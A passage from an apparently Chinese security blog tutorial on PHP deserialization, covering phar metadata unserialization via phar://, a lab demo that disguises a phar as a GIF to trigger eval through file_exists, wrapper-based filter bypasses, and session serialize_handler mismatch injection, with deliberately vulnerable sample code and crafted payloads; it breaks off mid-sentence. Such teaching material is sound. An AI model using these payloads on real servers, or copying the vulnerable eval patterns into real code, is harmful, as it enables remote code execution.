src="https://i.loli.net/2021/08/16/Iv3lNjUXtFoZpcw.png" alt="image-20210816144952619"></p></li><li><p>the file contents</p><p>所被压缩的文件内容，在无特殊要求的情况下，该内容可随意写</p></li><li><p>a signature for verifying Phar integrity</p><p>签名格式，位于末尾</p><p><img src="https://i.loli.net/2021/08/16/ROTrMWvjBeo1pmK.png" alt="image-20210816145202078"></p></li></ul><h2 id="3-3-测试：phar-文件的构造"><a href="#3-3-测试：phar-文件的构造" class="headerlink" title="3.3 测试：phar 文件的构造"></a>3.3 测试：phar 文件的构造</h2><ul><li><p>条件：php.ini</p><p><img src="https://i.loli.net/2021/08/16/zHR9QuMXmZEYaSO.png" alt="image-20210816145304311"></p></li></ul><p><strong>编写 生成 .phar 文件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$o</span>-&gt;data = <span class="string">&#x27;hacker123!&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名将自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问过后，会在当前目录下生成 <code>1.phar</code> 文件，打开，看其内容</p><p><img src="https://i.loli.net/2021/08/16/fIErdgbOZQ3Gs7t.png" alt="image-20210816150109626"></p><p><strong>发现，meta-data 是以序列化的形式存储的</strong></p><p><strong>那么，在哪里进行反序列化？</strong></p><p><strong>phar://协议读取文件</strong></p><ul><li><p>php 大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，经测试后，所受影响的函数有</p><p><img src="https://i.loli.net/2021/08/16/Gg6PJzalCAp9mhr.png" alt="image-20210816150354206"></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://1.phar&#x27;</span>);<span class="comment">//phar:// 触发：进行反序列化</span></span><br></pre></td></tr></table></figure><p>访问，成功触发了反序列化，得到 </p><p><img src="https://i.loli.net/2021/09/10/ev7ay5QxkIJBdtG.png" alt="image-20210816150553492"></p><h2 id="3-4-常见利用：文件上传-文件包含"><a href="#3-4-常见利用：文件上传-文件包含" class="headerlink" title="3.4 常见利用：文件上传+文件包含"></a>3.4 常见利用：文件上传+文件包含</h2><p><strong>环境：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload_file.php <span class="comment"># 后端检测文件上传,确保文件类型及后缀是 .gif</span></span><br><span class="line">upload_file.html <span class="comment">#文件上传表单前端</span></span><br><span class="line">file_un.php  <span class="comment">#存在 file_exists() 以及  __destruct() 用以phar://伪协议读取文件内容</span></span><br></pre></td></tr></table></figure><p><strong>利用条件：</strong></p><ul><li>存在文件上传</li><li>存在 <code>file_exists()  fopen()  file_get_contents()  file()</code> 等文件操作函数</li><li><code>phar://</code> 等字符未被过滤</li></ul><p><strong>upload_file.php</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>upload_file.html</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost:8080/ctf/phar/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><strong>file_un.php</strong>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlihgt_file(__FILE__);</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><p><strong>题目：</strong></p><p><img src="https://i.loli.net/2021/08/16/dOqcxFjsStoZmlM.png" alt="image-20210816151653686"></p><p><strong>生成 .phar 文件：</strong>phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlihgt_file(__FILE__);</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;hack.phar&quot;</span>); <span class="comment">//后缀必须为 .phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="comment">// 设置 stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> AnyClass();</span><br><span class="line"><span class="variable">$o</span>-&gt;output = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//签名2将自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>访问，得到 hack.phar</p><p><img src="https://i.loli.net/2021/08/16/FAST5wPB3aQu2IE.png" alt="image-20210816152258664"></p><p>将 hack.phar 后缀修改为 hack.gif</p><p>在 upload_file.html 里上传</p><p><img src="https://i.loli.net/2021/08/16/8q7iuL96Xj4CeSg.png" alt="image-20210816152845318"></p><p><img src="https://i.loli.net/2021/08/16/YRJEP4uIzharXQM.png" alt="image-20210816152858027"></p><p>然后我们进入 file_un.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://hack.gif</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/16/pZsvBjrJdhXlWcM.png" alt="image-20210816153008894"></p><p>可以看到，命令成功执行</p><h2 id="3-5-绕过姿势：过滤-phar"><a href="#3-5-绕过姿势：过滤-phar" class="headerlink" title="3.5 绕过姿势：过滤 phar"></a>3.5 绕过姿势：过滤 phar</h2><ul><li>当题目环境限制 phar 不能出现在前面的字符里，即无法使用 <code>phar:// 协议</code>  ，可以使用 <code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><ul><li><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></li><li><p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="variable">$phar</span>-&gt;setStub(“GIF89a”.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、生成一个phar.phar，修改后缀名为phar.gif</span><br></pre></td></tr></table></figure></li></ul><h2 id="3-6-php-session-反序列化"><a href="#3-6-php-session-反序列化" class="headerlink" title="3.6 php-session 反序列化"></a>3.6 php-session 反序列化</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p><p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral">https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral</a></p><p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p><h3 id="3-6-1-关于-php-中的-session-存储机制"><a href="#3-6-1-关于-php-中的-session-存储机制" class="headerlink" title="3.6.1 关于 php 中的 session 存储机制"></a>3.6.1 关于 php 中的 session 存储机制</h3><p><strong>session 介绍：</strong></p><blockquote><p>在计算机中，尤其是在网络应用中，称为“<strong>会话控制</strong>”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，<strong>将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。</strong>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p></blockquote><p><strong>php 中的 session 存储相关匹配值：</strong></p><p>PHP 版本 &gt;= 5.4 中有关 session 的相关配置：php.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line"><span class="comment"># enabled = on 表示 upload_progress 功能开启，即当浏览器向服务器上传一个文件时，php 会把此次文件上传的详细信息，如上传时间、上传进度等都储存在 session中</span></span><br><span class="line"></span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line"><span class="comment"># cleanup = on 当文件上传结束之后， oho 会立即将对应的 session 文件清空</span></span><br><span class="line"></span><br><span class="line">3. session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line">4. session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"># name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span></span><br><span class="line"><span class="comment"># 重点：prefix+name将表示为session中的键名</span></span><br><span class="line"></span><br><span class="line">5. session.upload_progress.freq = <span class="string">&quot;1%&quot;</span></span><br><span class="line">6. session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br><span class="line">7. session.use_strict_mode=off </span><br><span class="line"><span class="comment"># 表示我们对 Cookie 中的 session 是可控的</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. session.save_path=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设置 session 的储存路径</span></span><br><span class="line"></span><br><span class="line">2. session.save_handler=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></span><br><span class="line"></span><br><span class="line">3. session.auto_start</span><br><span class="line"><span class="comment"># boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span></span><br><span class="line"></span><br><span class="line">4. session.serialize_handler</span><br><span class="line"><span class="comment"># string --定义用来序列化/反序列化的处理器名字。默认使用php</span></span><br></pre></td></tr></table></figure><p>php 版本为 5.4.45 的部分默认配置如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;session.save_path = <span class="string">&quot;/tmp&quot;</span></span><br><span class="line">session.save_handler = files</span><br><span class="line">session.auto_start = 0</span><br><span class="line">session.serialize_handler = php</span><br></pre></td></tr></table></figure><p><code>session.serialize_handler = php</code> 该选项是用来设置 session 的 <code>序列化引擎</code> 的，除了默认的 php 引擎之外，也存在其他的，不同的 引擎对应的 session 的存储方式不同。</p><p><strong>其它存储引擎如下</strong>：</p><ul><li><strong>php_binary</strong>:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</li><li><strong>php</strong>:存储方式是，键名+竖线+经过serialize()函数序列处理的值</li><li><strong>php_serialize(php&gt;5.5.4)</strong>:存储方式是，经过serialize()函数序列化处理的值</li></ul><p>如果需要修改该引擎，须有手动添加代码 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code>，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br></pre></td></tr></table></figure><p>下面我们仅仅讨论 php 引擎所引起的 反序列化。</p><p><strong>php 中的 session 存储机制：</strong></p><p>php 中的 session 中的内容不是存在内存当中的，而是以文件的形式进行存储，存储方式是由配置项 <code>session.save_handler</code> 来进行确定的，默认以文件的方式存储。所存储的文件名是以 <code>sess_sessionid</code> 来进行命名的，文件的内容就是 session 值得序列化之后的内容。</p><p><img src="https://i.loli.net/2021/09/12/VwE3NXjsbhq5KoJ.png" alt="image-20210912093352903"></p><p>例如：客户端的用户进行抓包，在 <code>Cookie</code> 字段中进行设置 <code>PHPSESSION=test</code> ，则 服务器上就将会创建一个文件 <code>/tmp/sess_test</code> 文件，用于存储 用户的 SESSIONS 信息。</p><p>测试：PHP 7.3.4             </p><p><strong>php 默认引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/TNsWVOG8L9oZwQ3.png" alt="image-20210912100023408"></p><p>session 文件中其中，<code>name</code> 是键名，<code>s:4:&quot;test&quot;;</code> 是 <code>serialize(&quot;test&quot;)</code> 的结果。</p><p><strong>php_serialize 引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"> <span class="variable">$SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/ARNKoeV6fZXclxU.png" alt="image-20210912100614688"></p><p>session 文件内容是 a:1:{s:4:”name”;s:4:”test”;}，其中 </p><p><code>a:1</code> 只要是使用 php_serialize 引擎都会加上的，然后使用 php_serialize 引擎将会把 session 中的键名和键值都进行反序列化。</p><p><strong>在php_binary引擎下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"> session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/12/CVnR1U5O6mioqtc.png" alt="image-20210912101016728"></p><p>session 文件内容是 names:4:”test”;</p><p>由于<code>name</code>的长度是4，4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，最后就是<code>names:6:&quot;spoock&quot;;</code>。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧)</p><h3 id="3-6-2-php-session-序列化简单测试：利用原理"><a href="#3-6-2-php-session-序列化简单测试：利用原理" class="headerlink" title="3.6.2 php-session 序列化简单测试：利用原理"></a>3.6.2 php-session 序列化简单测试：利用原理</h3><p><strong>序列化简单测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">lover</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;func = <span class="string">&#x27;phpinfo()&#x27;</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以传入：<code>?a=O:5:&quot;lover&quot;:1:&#123;s:4:&quot;func&quot;;s:14:&quot;echo%20&quot;spoock&quot;;&quot;;&#125;</code></p><p>则将会在页面中输出 <code>spoock</code> 。</p><p><strong>php session 反序列化构造：</strong></p><p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br><strong>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确的进行反序列化。</strong>通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。</p><p>示例：</p><p>假如 题目本身是 php_serialize 的存储引擎，如果我们注入数据：<code>a=|o:4:&quot;test&quot;:0:&#123;&#125;</code></p><p>则 其通过 php_serialize 的引擎处理过后，将会变成 <code>a:1:&#123;s:1:&quot;a&quot;;a:16:&quot;|o:4:&quot;test&quot;:0:&#123;&#125;&quot;&#125;</code></p><p>随后 如果我们利用 php 的存储引擎来读取，那么经过解读之后将会理解为 ： <code>&#123;s:1:&quot;a&quot;;a:16:&quot;</code>  是键名，而 | 后面的就会被理解为一个对象的实例化注入。</p><p><strong>测试 ：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>访问 ?a=|o:4:”test”:0:{}</p><p>此时 session 文件内容为 a:1:{s:1:”a”;a:16:”|o:4:”test”:0:{}”}</p><p>设置 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> ，即使用 php 引擎读取，再次访问即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;a:16:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-6-3-php-session-序列化实际利用"><a href="#3-6-3-php-session-序列化实际利用" class="headerlink" title="3.6.3 php-session 序列化实际利用"></a>3.6.3 php-session 序列化实际利用</h3><p><strong>必备知识：</strong></p><ul><li><ul><li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p></li><li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p><p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 